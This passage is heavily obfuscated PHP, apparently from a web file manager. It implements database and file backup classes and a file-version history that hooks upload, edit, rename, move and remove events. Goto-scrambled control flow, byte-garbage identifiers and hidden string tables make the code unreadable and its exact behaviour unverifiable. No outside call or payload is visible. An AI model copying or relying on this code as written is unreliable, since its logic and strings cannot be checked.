AÔÑµ¸ï·: $A§ÓÒĞõ³¬ =& $_SERVER[«¾°Ã¤]; if (self::$manual == 1) { return; } $C¤´Ë¬ßÚ = Model($A§ÓÒĞõ³¬[718])->listData(); goto F½—˜Ø¥Öµ; eŸ¿‰è²•Š: } private function backupPath($AÄ›Œ¿Ü»î, $B‡Ó®¬Š²“ = false) { $AÜÂÃÅ¸ƒÅ =& $_SERVER[«¾°Ã¤]; if (!$B‡Ó®¬Š²“) { $B‡Ó®¬Š²“ = Model($AÜÂÃÅ¸ƒÅ[739])->get($AÜÂÃÅ¸ƒÅ[740]); } $E’‹‡½ïÈ = $AÄ›Œ¿Ü»î[$AÜÂÃÅ¸ƒÅ[28]]; $fÃ”—±‡õ³ = substr(md5($AÜÂÃÅ¸ƒÅ[741] . $B‡Ó®¬Š²“ . $E’‹‡½ïÈ), 0, 8); return "\173\x69\x6f\x3a{$AÄ›Œ¿Ü»î[$AÜÂÃÅ¸ƒÅ[721]]}\x7d\57\144\141\164\x61\142\141\x73\145\x2f\x62\141\x63\153\x75\x70\57" . $E’‹‡½ïÈ . $AÜÂÃÅ¸ƒÅ[71] . $fÃ”—±‡õ³; } public function db() { goto Aª•ÀÇ›¢ô; B“¥©ôë•­: $fÍ¨¢ç×¢î = new BackupDb(); if (!$fÍ¨¢ç×¢î->index()) { return !1; } self::set(array($bÄ‹¬Ì¡İ[742] => 1)); goto d¶…»ªÈùÈ; d¶…»ªÈùÈ: return !0; goto E¨•·Ä©‘ƒ; Aª•ÀÇ›¢ô: $bÄ‹¬Ì¡İ =& $_SERVER[«¾°Ã¤]; $d½½†‹Ö›Ò = self::get(); if ($d½½†‹Ö›Ò[$bÄ‹¬Ì¡İ[291]][$bÄ‹¬Ì¡İ[727]][$bÄ‹¬Ì¡İ[719]] == $bÄ‹¬Ì¡İ[87]) { return !0; } goto B“¥©ôë•­; E¨•·Ä©‘ƒ: } public function dbFile() { goto e…ßÃÙÚİ; FÇ™åÚİ•Œ: return !0; goto F¦÷Ù»Œ»®; dƒ‹ÌáÅğ†: $a‚ßÑ‡Òèò = new BackupDbFile(); if (!$a‚ßÑ‡Òèò->index()) { return !1; } self::set(array($déİ˜ÏÙ·[743] => 1)); goto FÇ™åÚİ•Œ; e…ßÃÙÚİ: $déİ˜ÏÙ· =& $_SERVER[«¾°Ã¤]; $eğƒ…õ±†š = self::get(); if ($eğƒ…õ±†š[$déİ˜ÏÙ·[291]][$déİ˜ÏÙ·[731]][$déİ˜ÏÙ·[719]] == $déİ˜ÏÙ·[87]) { return !0; } goto dƒ‹ÌáÅğ†; F¦÷Ù»Œ»®: } public function file() { $B­¿£¹Ùò‘ =& $_SERVER[«¾°Ã¤]; $C±¬µ² = self::get(); if ($C±¬µ²[$B­¿£¹Ùò‘[291]][$B­¿£¹Ùò‘[193]][$B­¿£¹Ùò‘[719]] == $B­¿£¹Ùò‘[87]) { return !0; } if (!isset($C±¬µ²[$B­¿£¹Ùò‘[724]]) || $C±¬µ²[$B­¿£¹Ùò‘[724]] == $B­¿£¹Ùò‘[191]) { $aåÏ‰¼éë© = new BackupFile(); if (!$aåÏ‰¼éë©->index()) { return !1; } } self::set(array($B­¿£¹Ùò‘[744] => 1, $B­¿£¹Ùò‘[719] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto F‰ß›ìäÂø; C…Ü‰¨”Ãã: foreach ($BßÚ’ëÀòÍ as $c½Ãíášèö) { $a‹Ì¹†ãõÎ += $dÛÑŒá½ÔÕ->model($c½Ãíášèö)->count(); } $DŒÒ à†êĞ = new Task($C²©†Şâ™[750], $C²©†Şâ™[751], $a‹Ì¹†ãõÎ, LNG($C²©†Şâ™[752]) . $C²©†Şâ™[753] . LNG($C²©†Şâ™[754])); foreach ($BßÚ’ëÀòÍ as $c½Ãíášèö) { $E²ÈØ‚ˆˆÉ = $C·¾“Èõˆ‚ . $c½Ãíášèö . $C²©†Şâ™[755]; $E—¬ñ¢àÚÀ = null; if ($c½Ãíášèö == $C²©†Şâ™[756] && (!isset($Bƒ¶ ‚Ò÷í[$C²©†Şâ™[724]]) || $Bƒ¶ ‚Ò÷í[$C²©†Şâ™[724]] == $C²©†Şâ™[191])) { $E—¬ñ¢àÚÀ = self::$io; } $fº™š›¨ += $dÛÑŒá½ÔÕ->sqlFromDb($c½Ãíášèö, $E²ÈØ‚ˆˆÉ, $DŒÒ à†êĞ, $E—¬ñ¢àÚÀ); } goto eäÓÇÇ‘±; D…Óøñ˜: $C·¾“Èõˆ‚ = $this->tmpFilesPath() . $C²©†Şâ™[747] . self::$name . $C²©†Şâ™[8]; del_dir($C·¾“Èõˆ‚); mk_dir($C·¾“Èõˆ‚); goto cÃÒÅìãßÓ; BêÃ×šÕİª: $dÛÑŒá½ÔÕ = new DbManage($EÎğ£›í­’, $d¾Ûµ˜¼¾Ä); $D¼¼Ëó•§Ó = array($C²©†Şâ™[745] => $d¾Ûµ˜¼¾Ä, $C²©†Şâ™[746] => time()); Backup::set($D¼¼Ëó•§Ó); goto D…Óøñ˜; F¥Á£‡»š: self::$name = $Bƒ¶ ‚Ò÷í[$C²©†Şâ™[28]]; $EÎğ£›í­’ = $GLOBALS[$C²©†Şâ™[6]][$C²©†Şâ™[17]]; $d¾Ûµ˜¼¾Ä = $this->_dbType($EÎğ£›í­’); goto BêÃ×šÕİª; eäÓÇÇ‘±: if (isset($DŒÒ à†êĞ->task[$C²©†Şâ™[757]])) { $eååâ¦´ÄÎ = $DŒÒ à†êĞ->task[$C²©†Şâ™[757]] ? $DŒÒ à†êĞ->task[$C²©†Şâ™[757]] : timeFloat(); $a¹†…ò¨«È = $eååâ¦´ÄÎ - $DŒÒ à†êĞ->task[$C²©†Şâ™[758]]; if ($a¹†…ò¨«È >= 0.2) { $a‹Ì¹†ãõÎ += 1; } } $DŒÒ à†êĞ->end(); $D¼¼Ëó•§Ó = array($C²©†Şâ™[745] => $d¾Ûµ˜¼¾Ä, $C²©†Şâ™[742] => 1, $C²©†Şâ™[759] => $a‹Ì¹†ãõÎ, $C²©†Şâ™[760] => $fº™š›¨, $C²©†Şâ™[761] => time()); goto BäÄŒ±¢; F‰ß›ìäÂø: $C²©†Şâ™ =& $_SERVER[«¾°Ã¤]; $Bƒ¶ ‚Ò÷í = Backup::get(); self::$io = $Bƒ¶ ‚Ò÷í[$C²©†Şâ™[721]]; goto F¥Á£‡»š; cÃÒÅìãßÓ: $a‹Ì¹†ãõÎ = $fº™š›¨ = 0; try { $BßÚ’ëÀòÍ = $dÛÑŒá½ÔÕ->db()->getTables(); } catch (Exception $d…¹ñ–…) { return !1; } $BßÚ’ëÀòÍ = array_diff($BßÚ’ëÀòÍ, array($C²©†Şâ™[748], $C²©†Şâ™[749])); goto C…Ü‰¨”Ãã; BäÄŒ±¢: Backup::set($D¼¼Ëó•§Ó); if ($a‹Ì¹†ãõÎ > $fº™š›¨) { write_log(array($C²©†Şâ™[762], $D¼¼Ëó•§Ó), $C²©†Şâ™[751]); return !1; } return !0; goto bñ¦¼‘æŒ; bñ¦¼‘æŒ: } private function _dbType($BË³Å‡ƒ) { goto aÜˆÂŠÚ—³; fÒ¼ÄÖ´ß: if ($E¹ğïİœè == $Dá¥š™ò®[764]) { $DßÚÌ´„ŠÇ = explode($Dá¥š™ò®[4], $BË³Å‡ƒ[$Dá¥š™ò®[765]]); $E¹ğïİœè = $DßÚÌ´„ŠÇ[0]; } $eÛ·ÄÏ›‡œ = array($Dá¥š™ò®[766] => $Dá¥š™ò®[9], $Dá¥š™ò®[767] => $Dá¥š™ò®[768]); if (isset($eÛ·ÄÏ›‡œ[$E¹ğïİœè])) { $E¹ğïİœè = $eÛ·ÄÏ›‡œ[$E¹ğïİœè]; } goto Eç™ñÂğœÆ; Eç™ñÂğœÆ: return $E¹ğïİœè; goto AÀ˜®âéíï; aÜˆÂŠÚ—³: $Dá¥š™ò® =& $_SERVER[«¾°Ã¤]; $BË³Å‡ƒ = array_change_key_case($BË³Å‡ƒ); $E¹ğïİœè = $BË³Å‡ƒ[$Dá¥š™ò®[763]]; goto fÒ¼ÄÖ´ß; AÀ˜®âéíï: } private function tmpFilesPath() { $dğö¹ŸÑŒ =& $_SERVER[«¾°Ã¤]; $eªË´‘Í¼Á = TEMP_FILES; if ($GLOBALS[$dğö¹ŸÑŒ[6]][$dğö¹ŸÑŒ[88]][$dğö¹ŸÑŒ[769]]) { $eªË´‘Í¼Á = $GLOBALS[$dğö¹ŸÑŒ[6]][$dğö¹ŸÑŒ[88]][$dğö¹ŸÑŒ[769]]; if (!mk_dir($eªË´‘Í¼Á) || !is_writable($eªË´‘Í¼Á) || !IO::mkfile($eªË´‘Í¼Á . $dğö¹ŸÑŒ[770])) { $eªË´‘Í¼Á = TEMP_FILES; } } return $eªË´‘Í¼Á; } } class BackupDbFile { public function __construct() { } public function index() { goto CæÍ…š®ŠŠ; föğÖ¸Û©Á: if (!$cğ¼Üß„Ú…) { return !1; } $D²¾“Ş‘öÈ = array($aÁ†ÆĞ»í[771] => $cğ¼Üß„Ú…, $aÁ†ÆĞ»í[772] => time()); Backup::set($D²¾“Ş‘öÈ); goto càÍ„ˆ´‡·; d›ßÊ„¨Ş‹: IO::copy($dõàÈ‹«·á, $F÷ƒ²); $Bø« ïãÀÁ->end(); $D²¾“Ş‘öÈ = array($aÁ†ÆĞ»í[779] => $cğ¼Üß„Ú…, $aÁ†ÆĞ»í[780] => time()); goto bŸ¤‹õ×‰; bŸ¤‹õ×‰: Backup::set($D²¾“Ş‘öÈ); return !0; goto Dœï”¸œ„; eçãâáìëô: $eÓ›å•Óó = CONTROLLER_DIR . $aÁ†ÆĞ»í[777]; $dõàÈ‹«·á = CONTROLLER_DIR . $aÁ†ÆĞ»í[778]; IO::copy($eÓ›å•Óó, $F÷ƒ²); goto d›ßÊ„¨Ş‹; CæÍ…š®ŠŠ: $aÁ†ÆĞ»í =& $_SERVER[«¾°Ã¤]; $Bº´Â‡éàÀ = Backup::get(); $Dª‘Ú¨ÕŒ“ = $Bº´Â‡éàÀ[$aÁ†ÆĞ»í[28]]; goto f„¨’ƒ§ÍŞ; bÄÔÏé†è: $aÉÏ³éè„ = IO::listPath($c ÇÒ¬Ëğ); $fğá„İ¼Öò = isset($aÉÏ³éè„[$aÁ†ÆĞ»í[74]]) ? $aÉÏ³éè„[$aÁ†ÆĞ»í[74]] : array(); $cğ¼Üß„Ú… = array_sum(array_column($fğá„İ¼Öò, $aÁ†ÆĞ»í[78])); goto föğÖ¸Û©Á; càÍ„ˆ´‡·: $Bø« ïãÀÁ = new TaskFileTransfer($aÁ†ÆĞ»í[773], $aÁ†ÆĞ»í[751], count($fğá„İ¼Öò), LNG($aÁ†ÆĞ»í[752]) . $aÁ†ÆĞ»í[449] . LNG($aÁ†ÆĞ»í[754]) . $aÁ†ÆĞ»í[774]); $Bø« ïãÀÁ->task[$aÁ†ÆĞ»í[732]] = $cğ¼Üß„Ú…; foreach ($aÉÏ³éè„[$aÁ†ÆĞ»í[74]] as $Eã‚¸¢Ñ) { $DÒ¥½©¡¤ê = IO::move($Eã‚¸¢Ñ[$aÁ†ÆĞ»í[76]], $F÷ƒ²); if (!$DÒ¥½©¡¤ê) { $Bø« ïãÀÁ->end(); $bŠ÷”œ³½ = IO::getLastError($aÁ†ÆĞ»í[775] . $Eã‚¸¢Ñ[$aÁ†ÆĞ»í[76]] . $aÁ†ÆĞ»í[776] . $F÷ƒ² . $aÁ†ÆĞ»í[513]); write_log($bŠ÷”œ³½, $aÁ†ÆĞ»í[751]); return !1; } } goto eçãâáìëô; f„¨’ƒ§ÍŞ: $c ÇÒ¬Ëğ = $this->tmpFilesPath() . "\142\x61\143\153\x75\160\x5f{$Dª‘Ú¨ÕŒ“}\x2f"; $F÷ƒ² = $this->backupPath($Bº´Â‡éàÀ); if (!($F÷ƒ² = IO::mkdir($F÷ƒ²))) { return !1; } goto bÄÔÏé†è; Dœï”¸œ„: } private function backupPath($f²³ù‡ÂÁİ) { $aœ‚ê²òØ =& $_SERVER[«¾°Ã¤]; $D˜…‘Ìàº = $f²³ù‡ÂÁİ[$aœ‚ê²òØ[28]]; $cÃŸœ·ˆ‰¨ = Model($aœ‚ê²òØ[739])->get($aœ‚ê²òØ[740]); $cˆ ŠàÆŠ = substr(md5($aœ‚ê²òØ[741] . $cÃŸœ·ˆ‰¨ . $D˜…‘Ìàº), 0, 8); return "\x7b\x69\157\72{$f²³ù‡ÂÁİ[$aœ‚ê²òØ[721]]}\x7d\x2f\144\x61\x74\141\x62\141\x73\145\57\x62\141\143\x6b\165\x70\57" . $D˜…‘Ìàº . $aœ‚ê²òØ[71] . $cˆ ŠàÆŠ; } private function tmpFilesPath() { $EŠôÆ´ƒ =& $_SERVER[«¾°Ã¤]; $Bâ‰ŸŠ¨‡ƒ = TEMP_FILES; if ($GLOBALS[$EŠôÆ´ƒ[6]][$EŠôÆ´ƒ[88]][$EŠôÆ´ƒ[769]]) { $Bâ‰ŸŠ¨‡ƒ = $GLOBALS[$EŠôÆ´ƒ[6]][$EŠôÆ´ƒ[88]][$EŠôÆ´ƒ[769]]; if (!mk_dir($Bâ‰ŸŠ¨‡ƒ) || !is_writable($Bâ‰ŸŠ¨‡ƒ) || !IO::mkfile($Bâ‰ŸŠ¨‡ƒ . $EŠôÆ´ƒ[770])) { $Bâ‰ŸŠ¨‡ƒ = TEMP_FILES; } } return $Bâ‰ŸŠ¨‡ƒ; } } goto e®«©É”Ç·; Dà‡„±É·Ó: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto Fâ½Ã•Óã; Fâ½Ã•Óã: $Fã–¼¬İäØ =& $_SERVER[«¾°Ã¤]; $D¯®™ÛÇ… = $GLOBALS[$Fã–¼¬İäØ[6]][$Fã–¼¬İäØ[88]]; if ($D¯®™ÛÇ…[$Fã–¼¬İäØ[1104]] != 1) { return; } goto fØº¸ÜÙµ; EùáºñƒÁ: Hook::bind($Fã–¼¬İäØ[1115], $Fã–¼¬İäØ[1116]); Hook::bind($Fã–¼¬İäØ[1117], $Fã–¼¬İäØ[1118]); goto fĞˆ ßˆ›Ø; fØº¸ÜÙµ: if ($D¯®™ÛÇ…[$Fã–¼¬İäØ[1105]] <= 0) { return; } if (isset($_REQUEST[$Fã–¼¬İäØ[1106]]) && $_REQUEST[$Fã–¼¬İäØ[1106]] == $Fã–¼¬İäØ[87]) { return; } Hook::bind($Fã–¼¬İäØ[1107], $Fã–¼¬İäØ[1108]); goto dƒÆ÷·¦µ‹; dƒÆ÷·¦µ‹: Hook::bind($Fã–¼¬İäØ[1109], $Fã–¼¬İäØ[1110]); Hook::bind($Fã–¼¬İäØ[1111], $Fã–¼¬İäØ[1112]); Hook::bind($Fã–¼¬İäØ[1113], $Fã–¼¬İäØ[1114]); goto EùáºñƒÁ; fĞˆ ßˆ›Ø: } public static function eventBeforeUpload($aã‡Ï—Ñ‡ç) { if ($aã‡Ï—Ñ‡ç[3] && $aã‡Ï—Ñ‡ç[3] != REPEAT_REPLACE) { return; } $eñ°»„‘µ = self::parsePath($aã‡Ï—Ñ‡ç[0]); if (!$eñ°»„‘µ) { return; } self::add($eñ°»„‘µ); } public static function eventBeforeEdit($cøÕâÜÆĞ) { $dƒğŒ‘ÜõÏ = self::parsePath($cøÕâÜÆĞ[0]); if (!$dƒğŒ‘ÜõÏ) { return; } self::add($dƒğŒ‘ÜõÏ); } public static function eventBeforeCopyFile($Aƒ“…¤ˆÒê, $bã¹Ô¬Š³Ñ, $d«Ú×æ¢, $d§òÌàÕÆ¸, $eÊÀƒÜÎ¦, $Dì¦÷¢Ÿ) { $A¹ºÎŠ÷¨î = $d«Ú×æ¢->getPathOuter($d§òÌàÕÆ¸); $e²ÁèÈ„Øİ = self::parsePath($A¹ºÎŠ÷¨î); if (!$e²ÁèÈ„Øİ) { return; } self::add($e²ÁèÈ„Øİ); } public static function eventBeforeRename($e»ÛğÊÚîÓ) { $eò†¦ËÍ«· =& $_SERVER[«¾°Ã¤]; $Fƒ¬°ÄŠ  = self::parsePath($e»ÛğÊÚîÓ[0]); if (!$Fƒ¬°ÄŠ ) { return; } $c¢­¼©Ò´Ú = self::checkInHistory($Fƒ¬°ÄŠ ); if (!$c¢­¼©Ò´Ú) { return; } if ($c¢­¼©Ò´Ú[$eò†¦ËÍ«·[29]] == $eò†¦ËÍ«·[193]) { $déš‹ñ÷‘ = self::listData($Fƒ¬°ÄŠ ); if ($déš‹ñ÷‘ && $déš‹ñ÷‘[$eò†¦ËÍ«·[367]]) { self::moveHistory($Fƒ¬°ÄŠ , $e»ÛğÊÚîÓ[1]); } } else { IO::rename($c¢­¼©Ò´Ú[$eò†¦ËÍ«·[76]], $e»ÛğÊÚîÓ[1]); } } public static function eventBeforeMove($a£ËæßÕ±Ş) { goto f¨ß‡Âˆ•; C²ëİØ‹Ü”: if ($b§—‚ÇÊ[$dª…»®‡Í…[29]] == $dª…»®‡Í…[193]) { $CÍÏšªßƒ = self::listData($b¢”Ôãé‘); $DËä½Ô˜· = rtrim($bƒªÓÇÅ®Û, $dª…»®‡Í…[8]) . $dª…»®‡Í…[8] . ($e‰ŸØ²¯÷ ? $e‰ŸØ²¯÷ : get_path_this($b¢”Ôãé‘)); $BìÊî‰Ï×Ô = self::listData($DËä½Ô˜·); if ($CÍÏšªßƒ && $CÍÏšªßƒ[$dª…»®‡Í…[367]] && $BìÊî‰Ï×Ô && $BìÊî‰Ï×Ô[$dª…»®‡Í…[367]]) { return self::clear($b¢”Ôãé‘); } if ($CÍÏšªßƒ && $CÍÏšªßƒ[$dª…»®‡Í…[367]]) { self::moveHistory($b¢”Ôãé‘, $e‰ŸØ²¯÷, $fÇÎí‚œõ†); } } else { IO::move($b§—‚ÇÊ[$dª…»®‡Í…[76]], $fÇÎí‚œõ†, !1, $e‰ŸØ²¯÷); self::clearEmptyFolder(IO::pathFather($b§—‚ÇÊ[$dª…»®‡Í…[76]])); } goto eËÇêåª¿¾; E—ƒ¤˜´ÚŠ: $b§—‚ÇÊ = self::checkInHistory($b¢”Ôãé‘); if (!$b§—‚ÇÊ) { return; } $fÇÎí‚œõ† = self::pathHistory($bƒªÓÇÅ®Û); goto C²ëİØ‹Ü”; C›ÖÊ‰˜‡: $bƒªÓÇÅ®Û = self::parsePath($a£ËæßÕ±Ş[1]); if (!$bƒªÓÇÅ®Û) { return; } $e‰ŸØ²¯÷ = $a£ËæßÕ±Ş[3]; goto E—ƒ¤˜´ÚŠ; f¨ß‡Âˆ•: $dª…»®‡Í… =& $_SERVER[«¾°Ã¤]; $b¢”Ôãé‘ = self::parsePath($a£ËæßÕ±Ş[0]); if (!$b¢”Ôãé‘) { return; } goto C›ÖÊ‰˜‡; eËÇêåª¿¾: } public static function eventAfterRemove($BÕ”è¤©˜ô, $BšŒ²©öŞ) { goto döŞˆò‘ø; cÈÑ¤‡Îšİ: if (!$DÕƒ…«¯”´) { return; } $EÄ»ä³Ë¨ã = self::checkInHistory($DÕƒ…«¯”´); if (!$EÄ»ä³Ë¨ã) { return; } goto EŒÊ åÂ¸“; EŒÊ åÂ¸“: if ($EÄ»ä³Ë¨ã[$d½×Ş³†ƒ[29]] == $d½×Ş³†ƒ[193]) { $cÔÄÎõŠÄ‘ = self::listData($DÕƒ…«¯”´, !1); if ($cÔÄÎõŠÄ‘ && $cÔÄÎõŠÄ‘[$d½×Ş³†ƒ[367]]) { self::clear($DÕƒ…«¯”´, !1); } } else { IO::remove($EÄ»ä³Ë¨ã[$d½×Ş³†ƒ[76]]); self::clearEmptyFolder(IO::pathFather($EÄ»ä³Ë¨ã[$d½×Ş³†ƒ[76]])); } goto d²–ÇÏÜáÑ; döŞˆò‘ø: $d½×Ş³†ƒ =& $_SERVER[«¾°Ã¤]; if (!$BšŒ²©öŞ) { return; } $DÕƒ…«¯”´ = self::parsePath($BÕ”è¤©˜ô[0]); goto cÈÑ¤‡Îšİ; d²–ÇÏÜáÑ: } private static function checkInHistory($aÀËÓ¯ÉÉÍ) { $C’ÌİœÜ¦  = self::pathHistory($aÀËÓ¯ÉÉÍ); if (!IO::exist($C’ÌİœÜ¦ )) { $C’ÌİœÜ¦  .= $_SERVER[«¾°Ã¤][1119]; } return IO::exist($C’ÌİœÜ¦ ) ? IO::info($C’ÌİœÜ¦ ) : !1; } private static function parsePath($aÖ‡¿ÙÂ¢„) { goto a²áƒÔø„£; a²áƒÔø„£: $eìˆˆà„ª× =& $_SERVER[«¾°Ã¤]; if (!$aÖ‡¿ÙÂ¢„) { return !1; } if ($GLOBALS[$eìˆˆà„ª×[1120]]) { return; } goto E‡‡îÅ¦˜÷; FƒÛŸø’õõ: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $D§ùñÓ•¡ô = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $eìˆˆà„ª×[1123]); foreach ($D§ùñÓ•¡ô as $B×ƒØñ©ñ) { if (!$B¼†÷¬³× && substr($aÖ‡¿ÙÂ¢„, 0, strlen($B×ƒØñ©ñ)) == $B×ƒØñ©ñ) { return !1; } } goto f»æ ëŒÄ; E‡‡îÅ¦˜÷: $BÇ»…–„¾Â = KodIO::parse($aÖ‡¿ÙÂ¢„); $B¼†÷¬³× = $BÇ»…–„¾Â[$eìˆˆà„ª×[29]]; $f¨¬çÆê¡Ÿ = !$B¼†÷¬³× || $B¼†÷¬³× == KodIO::KOD_IO || $B¼†÷¬³× == KodIO::KOD_SHARE_ITEM; goto Aôôù‡Ì¥õ; f»æ ëŒÄ: self::log($GLOBALS[$eìˆˆà„ª×[1044]] . $eìˆˆà„ª×[1124] . $aÖ‡¿ÙÂ¢„); return $aÖ‡¿ÙÂ¢„; goto dÀ«•™¾Ü; Aôôù‡Ì¥õ: if (!$f¨¬çÆê¡Ÿ || !$BÇ»…–„¾Â[$eìˆˆà„ª×[1121]]) { return !1; } if (substr($aÖ‡¿ÙÂ¢„, 0, strlen(DATA_PATH . $eìˆˆà„ª×[1122])) == DATA_PATH . $eìˆˆà„ª×[1122]) { return !1; } if ($B¼†÷¬³× == KodIO::KOD_SHARE_ITEM) { $BÎ°…‰’„“ = IO::init($aÖ‡¿ÙÂ¢„); if ($BÎ°…‰’„“->pathParse[$eìˆˆà„ª×[1049]]) { return self::parsePath($BÎ°…‰’„“->pathParse[$eìˆˆà„ª×[1049]]); } return !1; } goto FƒÛŸø’õõ; dÀ«•™¾Ü: } private static function pathHistory($CöÀÑªá) { $C“×«…±”ï =& $_SERVER[«¾°Ã¤]; $d¨Ñì‚‡Ã = self::$_historyBase . ltrim(KodIO::clear($CöÀÑªá), $C“×«…±”ï[8]); $d¨Ñì‚‡Ã = str_replace(array($C“×«…±”ï[1125]), array($C“×«…±”ï[1126]), $d¨Ñì‚‡Ã); return $d¨Ñì‚‡Ã; } public static function log($A‡‘ïõ¶õŠ) { } public static function historyCount($DóÂµÄ‚¡) { $a´âÜç„˜ =& $_SERVER[«¾°Ã¤]; $dºÊËÄõÒƒ = array(); $AàÅ–ô½–® = array(); foreach ($DóÂµÄ‚¡ as $cíô¦š§÷) { $CæÏ…ƒÂÖ = get_path_father($cíô¦š§÷); if (!$AàÅ–ô½–®[$CæÏ…ƒÂÖ]) { $AàÅ–ô½–®[$CæÏ…ƒÂÖ] = array(); } $AàÅ–ô½–®[$CæÏ…ƒÂÖ][] = get_path_this($cíô¦š§÷); } foreach ($AàÅ–ô½–® as $CæÏ…ƒÂÖ => $c­äŞ‘ˆ¯º) { $d¢ñÍîÛ÷Ì = self::parsePath($CæÏ…ƒÂÖ); if (!$d¢ñÍîÛ÷Ì) { continue; } foreach ($c­äŞ‘ˆ¯º as $bÉ­ìË†±˜) { $A…óÖï‘¢ = self::listData(rtrim($d¢ñÍîÛ÷Ì, $a´âÜç„˜[8]) . $a´âÜç„˜[8] . $bÉ­ìË†±˜, !1); if ($A…óÖï‘¢ && $A…óÖï‘¢[$a´âÜç„˜[367]]) { $dºÊËÄõÒƒ[rtrim($CæÏ…ƒÂÖ, $a´âÜç„˜[8]) . $a´âÜç„˜[8] . $bÉ­ìË†±˜] = count($A…óÖï‘¢[$a´âÜç„˜[367]]); } } } return $dºÊËÄõÒƒ; } public static function add($dÇ˜™©ğ¢§) { goto d¢ˆ¦ĞèÉ›; E„åÊ°¶Ôí: $f”¨×’«½ = array($F”»ºäÅÆ[393] => $e¢èÕŒ ’, $F”»ºäÅÆ[171] => $e¨˜ŠÁ˜ Ú, $F”»ºäÅÆ[28] => $b‡äÚŒö‘²[$F”»ºäÅÆ[28]] . $F”»ºäÅÆ[95] . date($F”»ºäÅÆ[1129]) . rand_string(1), $F”»ºäÅÆ[78] => $b‡äÚŒö‘²[$F”»ºäÅÆ[78]], $F”»ºäÅÆ[441] => USER_ID, $F”»ºäÅÆ[194] => time(), $F”»ºäÅÆ[1130] => $F”»ºäÅÆ[33]); IO::mkdir($d£Ï Ğ·‡[$F”»ºäÅÆ[1131]]); $C‹Àø¿‹Ù‰ = IO::copy($dÇ˜™©ğ¢§, $d£Ï Ğ·‡[$F”»ºäÅÆ[1131]], !1, $f”¨×’«½[$F”»ºäÅÆ[28]]); goto d”§·Öù¡; Fªñ¯Ò…»ø: $F½¡ÊÉÀæŒ = Model($F”»ºäÅÆ[739])->get($F”»ºäÅÆ[1127]); $c«¾‹«¦‹‰ = $GLOBALS[$F”»ºäÅÆ[6]][$F”»ºäÅÆ[88]][$F”»ºäÅÆ[1105]]; $CÕĞÙè›ë = $F½¡ÊÉÀæŒ == $F”»ºäÅÆ[1128] ? 5 : $c«¾‹«¦‹‰; goto C‰†šğˆˆ“; d¢ˆ¦ĞèÉ›: $F”»ºäÅÆ =& $_SERVER[«¾°Ã¤]; $d£Ï Ğ·‡ = self::listData($dÇ˜™©ğ¢§); if (!$d£Ï Ğ·‡) { return; } goto Fªñ¯Ò…»ø; AËËÁéÉç: return self::saveData($d£Ï Ğ·‡[$F”»ºäÅÆ[1132]], $d‰±æ¬óæ³); goto A—ÑœÂìÛ; C‰†šğˆˆ“: if ($c«¾‹«¦‹‰ <= 0) { return; } $e¨˜ŠÁ˜ Ú = IO::hashSimple($dÇ˜™©ğ¢§); $b‡äÚŒö‘² = IO::info($dÇ˜™©ğ¢§); goto D§ŒÚª”Ä; D§ŒÚª”Ä: $d‰±æ¬óæ³ = $d£Ï Ğ·‡[$F”»ºäÅÆ[367]]; if ($b‡äÚŒö‘²[$F”»ºäÅÆ[78]] == 0) { return; } if ($b‡äÚŒö‘²[$F”»ºäÅÆ[78]] >= 1024 * 1024 * 500) { return !1; } goto Bö¼“à™; Bö¼“à™: if ($d‰±æ¬óæ³ && $d‰±æ¬óæ³[0][$F”»ºäÅÆ[171]] == $e¨˜ŠÁ˜ Ú) { return !0; } if (array_key_exists($F”»ºäÅÆ[196], $b‡äÚŒö‘²) && !$b‡äÚŒö‘²[$F”»ºäÅÆ[196]]) { return !1; } $e¢èÕŒ ’ = short_id(time()); goto E„åÊ°¶Ôí; d”§·Öù¡: if (!$C‹Àø¿‹Ù‰) { self::clearEmptyFolder($d£Ï Ğ·‡[$F”»ºäÅÆ[1131]]); return !1; } array_unshift($d‰±æ¬óæ³, $f”¨×’«½); if (count($d‰±æ¬óæ³) > $CÕĞÙè›ë) { $dèƒƒƒ…Ä = array_slice($d‰±æ¬óæ³, $CÕĞÙè›ë); foreach ($dèƒƒƒ…Ä as $B‰´·ÏòŠÎ) { IO::remove($d£Ï Ğ·‡[$F”»ºäÅÆ[1131]] . $B‰´·ÏòŠÎ[$F”»ºäÅÆ[28]]); } $d‰±æ¬óæ³ = array_slice($d‰±æ¬óæ³, 0, $CÕĞÙè›ë); } goto AËËÁéÉç; A—ÑœÂìÛ: } public static function remove($e·çŸé¹Õ¨, $d¾ËòŞÍªà) { $B¨ÏÙİ“ì  =& $_SERVER[«¾°Ã¤]; $bº—œµƒ…¶ = self::listData($e·çŸé¹Õ¨); $eİŞ‹ƒ‘ÈÄ = array(); if (!$bº—œµƒ…¶) { return !1; } foreach ($bº—œµƒ…¶[$B¨ÏÙİ“ì [367]] as $a‚°ĞÛÁ‚Ü) { if ($a‚°ĞÛÁ‚Ü[$B¨ÏÙİ“ì [393]] == $d¾ËòŞÍªà) { IO::remove($bº—œµƒ…¶[$B¨ÏÙİ“ì [1131]] . $a‚°ĞÛÁ‚Ü[$B¨ÏÙİ“ì [28]]); continue; } $eİŞ‹ƒ‘ÈÄ[] = $a‚°ĞÛÁ‚Ü; } return self::saveData($bº—œµƒ…¶[$B¨ÏÙİ“ì [1132]], $eİŞ‹ƒ‘ÈÄ); } public static function clear($fÍ²ˆòè’, $DÃ˜æ­µØ¹ = true) { $A‡ö‡ö‘İá =& $_SERVER[«¾°Ã¤]; $Fì¥âŸ¾ = self::listData($fÍ²ˆòè’, $DÃ˜æ­µØ¹); if (!$Fì¥âŸ¾) { return !1; } foreach ($Fì¥âŸ¾[$A‡ö‡ö‘İá[367]] as $E‡Ù‚‚İª£) { IO::remove($Fì¥âŸ¾[$A‡ö‡ö‘İá[1131]] . $E‡Ù‚‚İª£[$A‡ö‡ö‘İá[28]]); } return self::saveData($Fì¥âŸ¾[$A‡ö‡ö‘İá[1132]], array()); } public static function moveHistory($D™äÁ¯¥°Ñ, $F®‡Á™ä¿ = '', $BŞ §Úº›† = '') { goto eñ»¼í„¥µ; a„İÙæ’ ‚: self::saveData($dŞŠá´ô‰´[$bÜº·‚„º¾[1132]], $dŞŠá´ô‰´[$bÜº·‚„º¾[367]]); self::clearEmptyFolder($dŞŠá´ô‰´[$bÜº·‚„º¾[1131]]); goto b¥Ô£Şáø¦; Dæ‘é¤êÏ»: $b²âš”¡´© = $bÜº·‚„º¾[1119]; 